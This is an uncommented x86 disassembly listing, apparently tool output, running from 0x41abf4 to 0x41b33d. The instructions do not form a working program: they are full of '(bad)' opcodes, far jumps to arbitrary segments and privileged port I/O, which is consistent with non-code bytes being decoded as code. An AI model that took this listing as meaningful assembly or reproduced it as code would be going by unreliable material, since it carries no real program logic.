  41abf4:	into   
  41abf5:	mov    eax,ds:0xf8bb65bf
  41abfa:	mov    ds:0xb684f304,eax
  41abff:	sub    al,0x8a
  41ac01:	xchg   esi,eax
  41ac02:	adc    al,0x31
  41ac04:	call   0x7d51:0x949abe7a
  41ac0b:	pop    es
  41ac0c:	test   cl,cl
  41ac0e:	popf   
  41ac0f:	fsub   DWORD PTR [ecx]
  41ac11:	(bad)  [eax+0x3f10cbf5]
  41ac17:	push   ds
  41ac18:	jbe    0x41abfb
  41ac1a:	cmc    
  41ac1b:	out    0x37,eax
  41ac1d:	xor    bh,BYTE PTR [esp+eax*1+0x5f]
  41ac21:	jb     0x41abab
  41ac23:	cmp    al,0x3c
  41ac25:	cmp    DWORD PTR [ebx+eiz*1-0x1b11dd70],esp
  41ac2c:	adc    eax,0x3af3f430
  41ac31:	cs out 0x6b,al
  41ac34:	xchg   ebx,eax
  41ac35:	and    ah,ch
  41ac37:	add    al,0xba
  41ac39:	adc    al,0x7b
  41ac3b:	xor    edi,DWORD PTR [ebx+0x144fb7ab]
  41ac41:	sub    esi,DWORD PTR [esi-0x459d6c61]
  41ac47:	adc    DWORD PTR [edi],ecx
  41ac49:	xchg   edx,eax
  41ac4a:	aam    0xea
  41ac4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac4d:	sub    al,0xcd
  41ac4f:	fdivr  QWORD PTR [edx]
  41ac51:	mov    bh,0x3e
  41ac53:	add    BYTE PTR [edi-0x4e],bh
  41ac56:	pop    ebp
  41ac57:	mov    dl,0xe3
  41ac59:	mov    al,ds:0xd3bf0aa2
  41ac5e:	call   0xf92ccb6c
  41ac63:	retf   0x5b9
  41ac66:	inc    edi
  41ac67:	mov    ch,0xe5
  41ac69:	aas    
  41ac6a:	jne    0x41aca0
  41ac6c:	jns    0x41ace5
  41ac6e:	jle    0x41ac96
  41ac70:	and    DWORD PTR [ecx-0x37],0xffffffec
  41ac74:	pop    ebx
  41ac75:	pop    esp
  41ac76:	dec    ecx
  41ac77:	call   0x71bd9137
  41ac7c:	test   ecx,eax
  41ac7e:	ins    DWORD PTR es:[edi],dx
  41ac7f:	mov    ds:0x6bc08ff0,al
  41ac84:	sbb    BYTE PTR [esi-0x7c],dh
  41ac87:	inc    esi
  41ac88:	stos   BYTE PTR es:[edi],al
  41ac89:	push   gs
  41ac8b:	cmp    ch,BYTE PTR [edx+0x6d]
  41ac8e:	loope  0x41ac25
  41ac90:	xor    al,0x21
  41ac92:	dec    esp
  41ac93:	icebp  
  41ac94:	popa   
  41ac95:	push   ecx
  41ac96:	xchg   ebx,eax
  41ac97:	inc    esi
  41ac98:	cmp    DWORD PTR [edx-0x52a21e1a],eax
  41ac9e:	cli    
  41ac9f:	push   ecx
  41aca0:	add    DWORD PTR [eax-0x4858a4fc],ecx
  41aca6:	xchg   esp,eax
  41aca7:	mov    ecx,0x4758c4f9
  41acac:	dec    esi
  41acad:	loope  0x41ac97
  41acaf:	push   0xffffff83
  41acb1:	icebp  
  41acb2:	xchg   ebp,eax
  41acb3:	pop    edi
  41acb4:	push   0xba8f9aa4
  41acb9:	mov    BYTE PTR [edi+0x8],cl
  41acbc:	mov    cl,0xd
  41acbe:	jbe    0x41ac68
  41acc0:	in     al,0xdb
  41acc2:	out    0x4,eax
  41acc4:	adc    DWORD PTR [esi+edi*1+0x72],ebx
  41acc8:	ins    DWORD PTR es:[edi],dx
  41acc9:	pop    eax
  41acca:	jmp    0x41acc5
  41accc:	mov    dh,0xb2
  41acce:	inc    ebx
  41accf:	and    DWORD PTR [esp+edi*8+0x73],0x58
  41acd4:	test   eax,0x190f9a0c
  41acd9:	add    eax,0x1323306f
  41acde:	add    eax,0xf859bc45
  41ace3:	inc    edx
  41ace4:	rcl    DWORD PTR [edi],1
  41ace6:	mov    ds:0xda5c8cb3,eax
  41aceb:	pop    ebx
  41acec:	mov    bl,cl
  41acee:	adc    eax,0x31770d81
  41acf3:	in     al,dx
  41acf4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41acf5:	stc    
  41acf6:	stos   DWORD PTR es:[edi],eax
  41acf7:	jnp    0x41acca
  41acf9:	in     al,0x42
  41acfb:	enter  0xfa1b,0x70
  41acff:	ins    BYTE PTR es:[edi],dx
  41ad00:	fld    st(6)
  41ad02:	pop    cx
  41ad04:	mov    DWORD PTR [eax],ebx
  41ad06:	(bad)  
  41ad07:	or     eax,0xd2eaddc8
  41ad0c:	adc    eax,0x22d096ee
  41ad11:	ja     0x41ad7f
  41ad13:	cmp    bx,cx
  41ad16:	ss adc al,0x2
  41ad19:	dec    esp
  41ad1a:	les    edx,FWORD PTR [edx-0x1e]
  41ad1d:	inc    esi
  41ad1e:	dec    esp
  41ad1f:	adc    al,0x97
  41ad21:	pop    es
  41ad22:	dec    esp
  41ad23:	jl     0x41ad08
  41ad25:	push   0x5f6ea27b
  41ad2a:	in     al,dx
  41ad2b:	inc    edx
  41ad2c:	xchg   ebp,eax
  41ad2d:	mov    BYTE PTR [edi+ebx*4-0x6d],0x64
  41ad32:	rol    DWORD PTR [eax+ebx*2-0x67],cl
  41ad36:	or     BYTE PTR [ebx-0x379d7a97],dl
  41ad3c:	aas    
  41ad3d:	push   esi
  41ad3e:	jle    0x41ad3d
  41ad40:	cli    
  41ad41:	add    eax,0xf6eef502
  41ad46:	push   esi
  41ad47:	cmp    eax,0xfa274be
  41ad4c:	cmp    ch,BYTE PTR [edi]
  41ad4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad4f:	inc    eax
  41ad50:	jo     0x41ad2f
  41ad52:	push   ebp
  41ad53:	xchg   ecx,eax
  41ad54:	daa    
  41ad55:	cmc    
  41ad56:	pop    ebx
  41ad57:	repz push 0xbfd78935
  41ad5d:	sub    eax,0x33aca64e
  41ad62:	mov    dl,BYTE PTR [edx-0x2d7336a9]
  41ad68:	gs and eax,0x322740f
  41ad6e:	dec    eax
  41ad6f:	sbb    al,0x44
  41ad71:	test   BYTE PTR [esp+eax*8],dh
  41ad74:	and    ecx,ebx
  41ad76:	jo     0x41ad33
  41ad78:	test   BYTE PTR [edx+0x6fc4952d],bh
  41ad7e:	stos   DWORD PTR es:[edi],eax
  41ad7f:	test   DWORD PTR [ecx],ebp
  41ad81:	imul   ebx,DWORD PTR [eax+ebx*4],0x5c
  41ad85:	loopne 0x41adc8
  41ad87:	xchg   edi,eax
  41ad88:	mov    ebx,0x51e54638
  41ad8d:	push   cs
  41ad8e:	addr16 je 0x41ad1a
  41ad91:	in     eax,0xae
  41ad93:	icebp  
  41ad94:	adc    bl,BYTE PTR [edi+0x2f76db74]
  41ad9a:	(bad)  
  41ad9b:	jnp    0x41adee
  41ad9d:	mov    al,0x9f
  41ad9f:	xor    BYTE PTR [ecx+0x1afeae5e],al
  41ada5:	sub    ebx,0x63
  41ada8:	xchg   BYTE PTR [esi],al
  41adaa:	dec    esp
  41adab:	cwde   
  41adac:	xor    al,0x76
  41adae:	cwde   
  41adaf:	sub    eax,0x923a1901
  41adb4:	retf   0x4f9e
  41adb7:	icebp  
  41adb8:	push   esp
  41adb9:	jnp    0x41ae37
  41adbb:	add    dh,BYTE PTR [ebp-0x4d]
  41adbe:	cdq    
  41adbf:	adc    esp,ebx
  41adc1:	inc    ecx
  41adc2:	fcmovnbe st,st(4)
  41adc4:	sbb    eax,0x1212a16b
  41adc9:	pop    edi
  41adca:	push   ebx
  41adcb:	push   esp
  41adcc:	mov    ah,ah
  41adce:	(bad)  
  41adcf:	out    0x12,eax
  41add1:	sbb    al,0x3
  41add3:	pop    di
  41add5:	mov    ecx,DWORD PTR [esi+esi*2-0x2a]
  41add9:	and    eax,0xb565925c
  41adde:	dec    edi
  41addf:	jb     0x41ade2
  41ade1:	push   esp
  41ade2:	lods   al,BYTE PTR ds:[esi]
  41ade3:	or     esi,esp
  41ade5:	pop    ebp
  41ade6:	test   BYTE PTR [edi-0x25027814],dl
  41adec:	or     BYTE PTR [ebx+0x40],dl
  41adef:	sbb    al,0x35
  41adf1:	cmp    eax,0xe28fe4eb
  41adf6:	mov    bh,0xe2
  41adf8:	mov    ebp,0x1c5d7ad3
  41adfd:	mov    DWORD PTR [esi+0x798f6c1e],ecx
  41ae03:	jbe    0x41adc3
  41ae05:	or     DWORD PTR [edx],esi
  41ae07:	add    cl,BYTE PTR [edi-0x3a]
  41ae0a:	mov    ebp,0xb05c5960
  41ae0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae10:	aam    0x50
  41ae12:	push   0xf6bee8cf
  41ae17:	jne    0x41ae58
  41ae19:	les    esp,FWORD PTR [edi+0x7a]
  41ae1c:	call   0x1025:0xcbdcfdd6
  41ae23:	adc    BYTE PTR cs:[esi+0x7f],al
  41ae27:	shl    BYTE PTR [ecx-0x69],0x42
  41ae2b:	call   0xa292eedd
  41ae30:	cld    
  41ae31:	mov    ds:0xe65b7af4,al
  41ae36:	pop    esp
  41ae38:	xchg   ebx,eax
  41ae39:	outs   dx,BYTE PTR ds:[esi]
  41ae3a:	sbb    DWORD PTR [ebp+0x77],esp
  41ae3d:	loop   0x41ae66
  41ae3f:	jne    0x41ae1b
  41ae41:	mov    esi,0x10d88cb5
  41ae46:	add    cl,BYTE PTR [ebp+ebp*4-0x4928f482]
  41ae4d:	jecxz  0x41ae69
  41ae4f:	dec    eax
  41ae50:	mov    edx,DWORD PTR [ebx-0x46fcff6c]
  41ae56:	(bad)  
  41ae57:	imul   ebx,esi,0xba040de1
  41ae5d:	loop   0x41ae8d
  41ae5f:	ins    DWORD PTR es:[edi],dx
  41ae60:	inc    esi
  41ae61:	cmc    
  41ae62:	and    DWORD PTR [esi],0x25
  41ae65:	scas   al,BYTE PTR es:[edi]
  41ae66:	mov    DWORD PTR [eax],edx
  41ae68:	inc    edx
  41ae69:	pop    ds
  41ae6a:	pusha  
  41ae6b:	jbe    0x41ae4e
  41ae6d:	xchg   edx,eax
  41ae6e:	(bad)  
  41ae6f:	in     eax,dx
  41ae70:	jl     0x41ae3f
  41ae72:	popf   
  41ae73:	jbe    0x41ae50
  41ae75:	test   BYTE PTR [esi],ch
  41ae77:	or     DWORD PTR [eax+0x41],0x75
  41ae7b:	dec    ebp
  41ae7c:	and    al,0x2c
  41ae7e:	cwde   
  41ae7f:	mov    al,bl
  41ae81:	cs pause 
  41ae84:	or     BYTE PTR [ebp-0x65],0x25
  41ae88:	and    DWORD PTR [edi],esi
  41ae8a:	xor    dl,BYTE PTR [ebx-0x3f]
  41ae8d:	pusha  
  41ae8e:	rcr    DWORD PTR ds:0x79b8e6b1,cl
  41ae94:	stos   DWORD PTR es:[edi],eax
  41ae95:	arpl   bp,cx
  41ae97:	adc    eax,0xccf5e38f
  41ae9c:	mov    ch,0x5e
  41ae9e:	daa    
  41ae9f:	mov    esi,0x9b1cf5cf
  41aea4:	je     0x41ae6f
  41aea6:	cld    
  41aea7:	pop    ds
  41aea8:	rol    BYTE PTR [esi+ecx*4+0x31],0xfb
  41aead:	daa    
  41aeae:	fiadd  WORD PTR [eax-0x27]
  41aeb1:	cmp    dl,BYTE PTR [ecx+0x1c]
  41aeb4:	adc    al,0xed
  41aeb6:	sub    ebp,ecx
  41aeb8:	cmp    al,0xac
  41aeba:	mov    dh,0xf
  41aebc:	test   BYTE PTR [edx-0x42],bh
  41aebf:	xor    al,BYTE PTR [edi]
  41aec1:	call   0xb260716e
  41aec6:	and    eax,0xef3a79b6
  41aecb:	loope  0x41aeec
  41aecd:	lds    ecx,FWORD PTR [edx+0x57321f75]
  41aed3:	xchg   edi,eax
  41aed4:	sar    BYTE PTR [eax-0x159e33c1],cl
  41aeda:	sub    BYTE PTR [ecx],ch
  41aedc:	out    dx,al
  41aedd:	repz xchg ecx,eax
  41aedf:	dec    eax
  41aee0:	inc    ebx
  41aee1:	pop    eax
  41aee2:	add    DWORD PTR [esi-0x49e5adb],edi
  41aee8:	or     eax,0x491d1d15
  41aeed:	jg     0x41ae97
  41aeef:	xlat   BYTE PTR ds:[ebx]
  41aef0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aef1:	rcl    BYTE PTR [esi-0x75ade9b0],cl
  41aef7:	mov    bl,0x98
  41aef9:	xor    BYTE PTR ds:0xa1510798,ch
  41aeff:	adc    eax,0x7e09d36
  41af04:	push   ds
  41af05:	xchg   ecx,eax
  41af06:	mov    ch,0x14
  41af08:	adc    edi,DWORD PTR [ecx]
  41af0a:	xor    eax,0x3d279543
  41af0f:	jno    0x41af8c
  41af11:	mov    esi,0xa76e9a5d
  41af16:	sub    BYTE PTR [ebp+0x3d],cl
  41af19:	clc    
  41af1a:	leave  
  41af1b:	scas   al,BYTE PTR es:[edi]
  41af1c:	xchg   edx,eax
  41af1d:	cmp    al,0x66
  41af1f:	pushf  
  41af20:	inc    edx
  41af21:	aaa    
  41af22:	sbb    eax,DWORD PTR [edi]
  41af24:	mov    eax,ds:0x234b9e3f
  41af29:	dec    edi
  41af2a:	fbstp  TBYTE PTR [edx]
  41af2c:	push   ds
  41af2d:	pop    es
  41af2e:	mov    bl,0xe0
  41af30:	ds jmp 0x17c5:0x61698733
  41af38:	pop    edx
  41af39:	mov    cl,0x5e
  41af3b:	imul   ebp,DWORD PTR [esi],0xe
  41af3e:	int3   
  41af3f:	lahf   
  41af40:	idiv   ebp
  41af42:	xchg   BYTE PTR [edi-0x25bfb716],ch
  41af48:	mov    ch,BYTE PTR [edi-0x1d]
  41af4b:	(bad)  
  41af4d:	jno    0x41af0a
  41af4f:	(bad)  
  41af50:	fcomp  st(3)
  41af52:	dec    ebx
  41af53:	or     ecx,DWORD PTR [eax+0x60]
  41af56:	dec    ebx
  41af57:	or     bl,BYTE PTR [ebx]
  41af59:	loope  0x41af4b
  41af5b:	or     BYTE PTR [ebp+0x13],ah
  41af5e:	mov    al,0xbd
  41af60:	jg     0x41aee8
  41af62:	(bad)  
  41af63:	int    0x34
  41af65:	pop    eax
  41af66:	jecxz  0x41af47
  41af68:	aaa    
  41af69:	dec    ecx
  41af6a:	scas   al,BYTE PTR es:[edi]
  41af6b:	aaa    
  41af6c:	test   eax,0x4585886c
  41af71:	xchg   ebp,eax
  41af72:	xchg   edx,eax
  41af73:	sar    DWORD PTR [esi-0xe],1
  41af76:	xor    cl,BYTE PTR [ebp-0x6f]
  41af79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af7a:	xchg   ebx,eax
  41af7b:	jo     0x41afd0
  41af7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41af7e:	mov    al,ds:0xdcefdabe
  41af83:	and    BYTE PTR [ebp-0x75],al
  41af86:	fs xor ah,cl
  41af89:	test   DWORD PTR [edi],0xcaaec6b3
  41af8f:	sub    DWORD PTR [esi+0x3588e354],edi
  41af95:	adc    BYTE PTR [esi],0x56
  41af98:	mov    al,ds:0x4a1a1b40
  41af9d:	mov    bl,0x1a
  41af9f:	in     al,0xce
  41afa1:	dec    edi
  41afa2:	dec    edx
  41afa3:	dec    ebp
  41afa4:	test   al,0xdf
  41afa6:	(bad)  [edi]
  41afa8:	sbb    esp,DWORD PTR [ecx-0x60]
  41afab:	sub    eax,0x1f034da0
  41afb0:	sub    cl,BYTE PTR [ecx+ebx*1]
  41afb3:	sub    eax,0x7e4f017b
  41afb8:	add    esi,ebp
  41afba:	mov    al,dl
  41afbc:	cmp    edi,0x2b
  41afbf:	mov    dl,0x91
  41afc1:	and    eax,0x2beb54c9
  41afc6:	(bad)  
  41afc7:	(bad)  
  41afc8:	aaa    
  41afc9:	adc    ebp,DWORD PTR [ecx-0x6c]
  41afcc:	inc    esp
  41afcd:	dec    edx
  41afce:	adc    al,0x51
  41afd0:	pop    edx
  41afd1:	call   0x19fdfc18
  41afd6:	inc    eax
  41afd7:	jnp    0x41af60
  41afd9:	ds mov dl,0x36
  41afdc:	lock sbb al,0xe8
  41afdf:	xor    eax,0xa55870d8
  41afe4:	mov    ebp,0x3e75e5d6
  41afe9:	mov    ss,WORD PTR [edi+0x33]
  41afec:	cld    
  41afed:	pop    ebp
  41afee:	pop    esp
  41afef:	sahf   
  41aff0:	or     eax,0xb6778001
  41aff5:	jle    0x41b018
  41aff7:	pop    ebx
  41aff8:	enter  0x136a,0x3
  41affc:	xchg   ecx,edi
  41affe:	not    BYTE PTR [edx+0x323a0912]
  41b004:	es pop ss
  41b006:	dec    ebx
  41b007:	push   0x1c0401e9
  41b00c:	jns    0x41b053
  41b00e:	cli    
  41b00f:	into   
  41b010:	lock call 0x7262:0x1c83e374
  41b018:	inc    esp
  41b019:	lahf   
  41b01a:	and    ecx,DWORD PTR [esi]
  41b01c:	fistp  QWORD PTR [ebx+ebp*4-0x7ca93217]
  41b023:	mov    ds:0x529bf988,eax
  41b028:	mov    BYTE PTR [esp+esi*4-0x4f],bh
  41b02c:	inc    edi
  41b02d:	test   bh,dh
  41b02f:	mov    dl,0xbe
  41b031:	(bad)  
  41b033:	cmp    al,BYTE PTR [eax-0x41]
  41b036:	xor    al,0xc6
  41b038:	(bad)  
  41b039:	mov    ebx,0x8d808dbd
  41b03e:	push   ecx
  41b03f:	cmp    DWORD PTR ds:0xd7a7b588,0xfffffff1
  41b046:	mov    eax,ds:0x78ff1cad
  41b04b:	and    dl,BYTE PTR [edi]
  41b04d:	adc    esi,DWORD PTR [edx-0xc]
  41b050:	out    0x63,al
  41b052:	push   esp
  41b053:	fsubr  st(5),st
  41b055:	fwait
  41b056:	mov    esp,0x5605acc8
  41b05b:	loop   0x41b019
  41b05d:	addr16 jb 0x41b07b
  41b060:	das    
  41b061:	jg     0x41b0bb
  41b063:	lods   eax,DWORD PTR ds:[esi]
  41b064:	pop    esi
  41b065:	ss jb  0x41b05a
  41b068:	lahf   
  41b069:	adc    eax,0x79d61972
  41b06e:	jbe    0x41b09f
  41b070:	cld    
  41b071:	imul   esp,DWORD PTR [ebx+0x28d4cc81],0x62b7940
  41b07b:	daa    
  41b07c:	das    
  41b07d:	leave  
  41b07e:	and    cl,BYTE PTR ds:0x411be513
  41b084:	adc    cl,BYTE PTR [eax+edx*4+0x552cf26c]
  41b08b:	stos   DWORD PTR es:[edi],eax
  41b08c:	xchg   ebx,eax
  41b08d:	xchg   esi,eax
  41b08e:	fcom   DWORD PTR ds:0x55552492
  41b094:	pop    ds
  41b095:	fwait
  41b096:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b097:	fwait
  41b098:	in     al,0xaf
  41b09a:	jmp    0xa9d6:0xa4e1232c
  41b0a1:	push   esp
  41b0a2:	pop    ecx
  41b0a3:	lea    ebp,[esi-0x4c79f9b]
  41b0a9:	retf   
  41b0aa:	sub    ecx,DWORD PTR [edx+0x7e]
  41b0ad:	out    0x22,al
  41b0af:	aam    0x3b
  41b0b1:	stc    
  41b0b2:	leave  
  41b0b3:	xchg   DWORD PTR [eax+0x25c42ca3],eax
  41b0b9:	sbb    BYTE PTR [ecx+0x1b],bh
  41b0bc:	lahf   
  41b0bd:	call   0xe7e9:0x99d53589
  41b0c4:	stos   BYTE PTR es:[edi],al
  41b0c5:	cmp    BYTE PTR [edi],0xc7
  41b0c8:	ins    BYTE PTR es:[edi],dx
  41b0c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b0ca:	pop    eax
  41b0cb:	sbb    BYTE PTR [esi-0x32d70041],bl
  41b0d1:	xchg   bh,al
  41b0d3:	mov    dl,0xc3
  41b0d5:	pop    es
  41b0d6:	jmp    0x99d9:0x9f083556
  41b0dd:	inc    esp
  41b0de:	arpl   WORD PTR [edx+0x20],ax
  41b0e1:	adc    BYTE PTR [ecx+0x5999a9a8],0xa0
  41b0e8:	in     eax,dx
  41b0e9:	rcl    edi,1
  41b0eb:	inc    BYTE PTR [esi-0x45]
  41b0ee:	push   eax
  41b0ef:	xor    ebx,esi
  41b0f1:	dec    ebx
  41b0f2:	dec    esp
  41b0f3:	jmp    0xa810:0xf73f5f8b
  41b0fa:	inc    esi
  41b0fb:	jb     0x41b156
  41b0fd:	retf   0x2661
  41b100:	bsr    ecx,DWORD PTR [edi+0x2c]
  41b104:	mov    cl,0xf5
  41b106:	mov    bh,0xda
  41b108:	add    BYTE PTR [esi+ebp*1-0x25],dl
  41b10c:	(bad)  
  41b10d:	pop    ecx
  41b10e:	xchg   ebp,eax
  41b10f:	fsub   DWORD PTR [ebp+0x37aa6f1b]
  41b115:	mov    ?,WORD PTR ds:[edi-0x45]
  41b119:	lds    ebp,FWORD PTR [ecx]
  41b11b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b11c:	inc    ebx
  41b11d:	add    DWORD PTR [ecx-0x45d3b529],esp
  41b123:	and    BYTE PTR [ecx*2+0x6219b77b],ch
  41b12a:	dec    esi
  41b12b:	fisub  WORD PTR [eax+0x60f8872b]
  41b131:	mov    ds:0xc8dc9b12,al
  41b136:	mov    ch,0x8e
  41b138:	pop    edx
  41b139:	lods   al,BYTE PTR ds:[esi]
  41b13a:	xchg   esp,ecx
  41b13c:	mov    ds:0xd74ae7bc,eax
  41b141:	fcomp  QWORD PTR [eax+0x25af42d1]
  41b147:	(bad)  
  41b148:	pushf  
  41b149:	out    0x9b,al
  41b14b:	add    DWORD PTR [edx],eax
  41b14d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b14e:	mov    ebp,0x6f43a5fb
  41b153:	(bad)  
  41b154:	(bad)  
  41b155:	or     DWORD PTR [ebp-0x12],ecx
  41b158:	jecxz  0x41b110
  41b15a:	loopne 0x41b1a1
  41b15c:	mov    es,edi
  41b15e:	(bad)  
  41b15f:	fbstp  TBYTE PTR [ebx+0x5c]
  41b162:	mov    edi,0x262b3f6b
  41b167:	sub    BYTE PTR [edx+esi*1],0xae
  41b16b:	cmp    ecx,DWORD PTR ds:[ebx]
  41b16e:	jmp    0x41b1ca
  41b170:	adc    BYTE PTR [eax+0x1ca513e7],ah
  41b176:	pop    ds
  41b177:	dec    esp
  41b178:	jp     0x41b188
  41b17a:	jo     0x41b15e
  41b17c:	mov    ds,WORD PTR [esi-0xe]
  41b17f:	(bad)  
  41b180:	mov    al,0x23
  41b182:	test   DWORD PTR [edi+0x735fd0f4],ebp
  41b188:	fdivr  st(1),st
  41b18a:	inc    edi
  41b18b:	mov    ds:0x91fc0e57,al
  41b190:	repz loope 0x41b15b
  41b193:	dec    esi
  41b194:	mov    ecx,0x27b7e91c
  41b199:	xchg   BYTE PTR [ebx-0x4fffcc03],bl
  41b19f:	lods   al,BYTE PTR ds:[esi]
  41b1a0:	or     BYTE PTR [ebx-0x68],cl
  41b1a3:	mov    bh,cl
  41b1a5:	adc    bl,cl
  41b1a7:	sub    bl,BYTE PTR [esi+ecx*8+0x14]
  41b1ab:	sbb    DWORD PTR [eax+0x75],edx
  41b1ae:	in     eax,dx
  41b1af:	xchg   ecx,eax
  41b1b0:	jecxz  0x41b22f
  41b1b2:	(bad)  
  41b1b3:	ins    BYTE PTR es:[edi],dx
  41b1b4:	mov    ah,0x6a
  41b1b6:	gs inc edx
  41b1b8:	cs inc esp
  41b1ba:	out    0xca,eax
  41b1bc:	repz das 
  41b1be:	mov    ebx,0x9be81c47
  41b1c3:	jno    0x41b146
  41b1c5:	sub    DWORD PTR [edx+edx*8+0x2a],0xcba1d81a
  41b1cd:	push   eax
  41b1ce:	inc    ecx
  41b1cf:	jg     0x41b16a
  41b1d1:	mov    ch,0xff
  41b1d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b1d4:	adc    DWORD PTR [edi+0x4a],eax
  41b1d7:	lea    ebx,[eax+0xc7eed6c]
  41b1dd:	arpl   WORD PTR [esi],ax
  41b1df:	mov    ah,0x5b
  41b1e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b1e2:	cld    
  41b1e3:	mov    edx,0x944a880
  41b1e8:	add    ebp,DWORD PTR [ebx-0x15]
  41b1eb:	push   edi
  41b1ec:	jl     0x41b242
  41b1ee:	scas   al,BYTE PTR es:[edi]
  41b1ef:	test   DWORD PTR [ecx-0x29],ebx
  41b1f2:	dec    ebp
  41b1f3:	cmp    dl,dh
  41b1f5:	in     al,0xda
  41b1f7:	mov    dh,0x3e
  41b1f9:	or     BYTE PTR [esi],ch
  41b1fb:	(bad)  
  41b1fc:	cdq    
  41b1fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b1fe:	in     eax,0xdc
  41b200:	pop    ebx
  41b201:	add    bl,dh
  41b203:	push   ebx
  41b204:	xchg   BYTE PTR [esi+0x79454c53],cl
  41b20a:	dec    ecx
  41b20b:	addr16 call 0x18b9:0xc724c63a
  41b213:	inc    ecx
  41b214:	stos   DWORD PTR es:[edi],eax
  41b215:	cs pop edi
  41b217:	aam    0xf7
  41b219:	adc    eax,0x908175fe
  41b21e:	stos   BYTE PTR es:[edi],al
  41b21f:	lea    eax,[ebx+0x542a3f0a]
  41b225:	fild   WORD PTR [ecx-0x3fd83d0f]
  41b22b:	push   cs
  41b22c:	shl    DWORD PTR [ebx],cl
  41b22e:	push   edi
  41b22f:	je     0x41b1e3
  41b231:	(bad)  
  41b232:	lods   al,BYTE PTR ds:[esi]
  41b233:	jns    0x41b25d
  41b235:	mov    ebp,DWORD PTR [edi+0x42]
  41b238:	or     eax,0x5b0acaeb
  41b23d:	lds    ecx,FWORD PTR [ebx]
  41b23f:	sub    eax,0x5fd96082
  41b244:	ds dec ebp
  41b246:	aaa    
  41b247:	jg     0x41b289
  41b249:	mov    esp,0x1487cb9b
  41b24e:	ins    DWORD PTR es:[edi],dx
  41b24f:	popf   
  41b250:	mov    al,0xb6
  41b252:	not    ecx
  41b254:	ins    DWORD PTR es:[edi],dx
  41b255:	test   dh,bh
  41b257:	inc    eax
  41b258:	sbb    DWORD PTR ds:0xba5ece8c,ecx
  41b25e:	sar    ah,1
  41b260:	xor    DWORD PTR [esi-0x3],ebx
  41b263:	int3   
  41b264:	ins    DWORD PTR es:[edi],dx
  41b265:	jns    0x41b2e1
  41b267:	ja     0x41b1f0
  41b269:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b26a:	add    DWORD PTR [eax+esi*8],eax
  41b26d:	xor    al,0x8f
  41b26f:	(bad)  
  41b270:	dec    ecx
  41b271:	mov    ebx,DWORD PTR ds:0x1944a15d
  41b277:	inc    edx
  41b278:	cld    
  41b279:	mov    WORD PTR [ebx+0x2],gs
  41b27c:	shl    BYTE PTR [ebp-0x1ccfa6cc],cl
  41b282:	sbb    ebp,esi
  41b284:	sbb    eax,0x9f3da9bb
  41b289:	add    eax,DWORD PTR [edx]
  41b28b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b28c:	scas   eax,DWORD PTR es:[edi]
  41b28d:	into   
  41b28e:	sahf   
  41b28f:	mov    cl,BYTE PTR [eax+0x28b32fa8]
  41b295:	mov    BYTE PTR [esi-0x5a],bl
  41b298:	pop    edi
  41b299:	push   0x28783925
  41b29e:	jb     0x41b25f
  41b2a0:	sbb    BYTE PTR [ebp-0x39],ah
  41b2a3:	cli    
  41b2a4:	je     0x41b279
  41b2a6:	(bad)  
  41b2a7:	or     cl,BYTE PTR [edi]
  41b2a9:	mov    eax,ds:0xad799785
  41b2ae:	shr    DWORD PTR [ebx+0x6174af5],0x56
  41b2b5:	pop    es
  41b2b6:	push   edx
  41b2b7:	clc    
  41b2b8:	pop    ebx
  41b2b9:	sti    
  41b2ba:	dec    esi
  41b2bb:	sti    
  41b2bc:	shr    BYTE PTR [ecx],1
  41b2be:	in     eax,dx
  41b2bf:	mov    dl,0xce
  41b2c1:	(bad)  
  41b2c2:	das    
  41b2c3:	hlt    
  41b2c4:	mov    ebx,0xbb3e6187
  41b2c9:	xor    bl,BYTE PTR [ebx+eax*8+0x34]
  41b2cd:	sub    BYTE PTR [ecx+0x2f],bl
  41b2d0:	push   ds
  41b2d1:	rcr    BYTE PTR [esi+0x3],0x89
  41b2d5:	ret    
  41b2d6:	fmul   DWORD PTR [eax-0x7db7d717]
  41b2dc:	mov    ebx,0x6d3715ce
  41b2e1:	push   esi
  41b2e2:	push   ds
  41b2e3:	jl     0x41b2af
  41b2e5:	js     0x41b311
  41b2e7:	xchg   esp,eax
  41b2e8:	pusha  
  41b2e9:	cli    
  41b2ea:	jb     0x41b2cd
  41b2ec:	fcom   st(3)
  41b2ee:	adc    DWORD PTR [ebx-0x3bbfcb50],edx
  41b2f4:	inc    edx
  41b2f5:	ins    DWORD PTR es:[edi],dx
  41b2f6:	mov    esi,0x31367311
  41b2fb:	aaa    
  41b2fc:	jnp    0x41b2ed
  41b2fe:	dec    ebx
  41b2ff:	outs   dx,BYTE PTR ds:[esi]
  41b300:	jno    0x41b356
  41b302:	(bad)  
  41b303:	sbb    ebx,DWORD PTR [eax-0x695f0b37]
  41b309:	and    ch,BYTE PTR [ebx]
  41b30b:	popa   
  41b30c:	push   edi
  41b30d:	cwde   
  41b30e:	repz mov esi,0xe3af3d90
  41b314:	mov    DWORD PTR [esp+ecx*2],ebx
  41b317:	jnp    0x41b340
  41b319:	sub    al,0x19
  41b31b:	mov    dh,0x19
  41b31d:	jge    0x41b302
  41b31f:	jmp    0xa614:0xe36380dd
  41b326:	cmp    DWORD PTR [esi-0x73a634dd],edx
  41b32c:	mov    gs,WORD PTR [ecx+0x3ab62eb4]
  41b332:	fwait
  41b333:	std    
  41b334:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b335:	inc    ebx
  41b336:	data16 stos BYTE PTR es:[edi],al
  41b338:	and    BYTE PTR [ecx+edx*8-0x1c],bh
  41b33c:	inc    eax
  41b33d:	aaa    
